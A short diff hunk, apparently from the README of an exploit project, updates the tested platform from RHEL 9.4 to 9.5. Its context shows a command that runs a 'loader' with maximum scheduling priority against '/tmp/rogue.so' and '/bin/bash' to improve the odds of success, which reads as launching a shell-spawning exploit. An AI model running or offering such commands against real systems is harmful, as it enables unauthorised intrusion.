@@ -18,4 +18,4 @@ For optimal chances of success when executing the loader, it's recommended to ex
 
 chrt -f 99 taskset -c 0 bash -c 'ulimit -l unlimited && ionice -c1 -n0 ./loader /tmp/rogue.so /bin/bash'
 
-Tested in RHEL 9.4
+Tested in RHEL 9.5
